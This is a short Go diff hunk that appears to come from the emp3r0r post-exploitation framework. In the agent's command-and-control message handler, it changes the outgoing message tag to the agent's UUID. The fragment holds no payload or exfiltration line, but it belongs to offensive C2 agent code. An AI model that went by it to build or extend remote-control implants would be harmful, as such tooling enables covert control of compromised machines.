@@ -26,7 +26,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		outCombined []byte
 		err         error
 	)
-	data2send.Tag = emp3r0r_data.Tag
+	data2send.Tag = emp3r0r_data.AgentUUID
 
 	payloadSplit := strings.Split(data.Payload, emp3r0r_data.OpSep)
 	op := payloadSplit[0]
